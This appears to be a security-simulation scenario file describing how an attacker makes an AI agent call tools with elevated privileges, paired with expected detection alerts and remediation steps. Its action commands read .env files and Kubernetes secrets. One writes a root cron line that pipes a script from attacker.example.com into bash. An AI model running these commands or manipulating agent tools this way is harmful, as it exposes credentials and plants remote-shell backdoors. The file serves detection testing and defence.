name: Tool-Use Privilege Escalation
description: Attacker crafts prompts that cause an AI agent to invoke tools with higher privileges than intended, escalating from read-only to write/admin access through tool parameter manipulation
real_world_relevance: ChatGPT plugin privilege escalation (2023), LangChain arbitrary code execution via tool abuse, Copilot Workspace unauthorized file modification, MCP tool permission bypass in Cursor IDE

attack_flow.description: Attacker manipulates agent tool invocations to execute operations at a higher privilege level than the agent should have
diagram: 1. Attacker identifies agent tools with different privilege tiers
2. Crafts prompt that causes tool invocation with elevated parameters
3. Agent passes attacker-controlled arguments to privileged tool
4. Tool executes with elevated permissions (e.g., admin API calls)
5. Attacker achieves privilege escalation through the agent

phases.name: Tool Capability Enumeration
phases.description: Discover available tools and their permission levels

actions.command: find / -path '*/tools/*' -name '*.py' -o -path '*/tools/*' -name '*.js' 2>/dev/null | head -10 || echo 'No tool definitions found'
env | grep -iE 'ADMIN|ELEVATED|PRIVILEGE|ROLE|SUDO' 2>/dev/null || echo 'No privilege-related env vars'

phases.name: Privilege Escalation via Tool Parameters
phases.description: Manipulate tool invocation to execute with elevated privileges

actions.command: echo '[tool_use] execute_command with role=admin: whoami && id' && whoami && id 2>/dev/null || echo 'Privilege escalation simulated'
actions.description: Simulate tool invocation with elevated role parameter

actions.command: echo '[tool_use] file_write with admin override: /etc/cron.d/backdoor' && echo '* * * * * root curl http://attacker.example.com/shell | bash' > /tmp/escalation_demo.txt 2>/dev/null && echo 'Privileged file write simulated'
actions.description: Simulate privileged file write via escalated tool

phases.name: Post-Escalation Actions
phases.description: Execute admin-level operations using escalated privileges

actions.command: echo '[tool_use] api_call with scope=admin:org: GET /admin/secrets' && cat /app/.env 2>/dev/null || echo 'Admin API access simulated'
actions.description: Access admin-only resources via escalated tool

actions.command: echo '[tool_use] kubectl with cluster-admin: get secrets -A' && kubectl get secrets -A 2>/dev/null || echo 'Cluster-admin access simulated'
actions.description: Attempt cluster-admin operations via escalated tool

indicators_of_compromise.description: Agent tool invoked with elevated privileges
Agent privilege escalation via tool use

expected_wazuh_alerts.description: NHI: Agent tool invoked with elevated privileges
NHI: Agent privilege escalation via tool use

immediate: Disable the agent's tool access until the vulnerability is patched
Audit all actions taken with escalated privileges
Rotate any credentials or tokens that were accessible
long_term: Implement server-side tool permission enforcement (not client-side)
Use least-privilege tool definitions with strict parameter schemas
Deploy tool invocation rate limiting and anomaly detection
Implement human-in-the-loop approval for high-privilege tool calls
Use capability-based security for agent tool access
